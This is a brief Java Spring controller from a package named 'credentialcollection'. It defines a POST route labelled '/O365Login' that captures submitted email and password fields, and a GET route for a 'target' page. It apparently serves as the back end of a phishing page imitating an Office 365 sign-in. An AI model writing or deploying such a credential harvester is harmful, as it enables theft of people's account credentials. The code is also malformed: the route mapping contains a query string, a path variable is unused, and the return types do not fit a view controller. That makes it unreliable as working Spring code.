package com.example.credentialcollection;

import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.*;

@Controller
public class CredentialController {

    @GetMapping("/TargetPost/{target}")
    public String getCredentials(Model model) {
        model.addAttribute("target", new TargetPost());
        return "target";
    }

    @PostMapping("/O365Login?id=email&content=password")
    public TargetPost postCredentials(@ModelAttribute TargetPost target, Model model) {
        model.addAttribute("target", target);
        return target;
    }
}
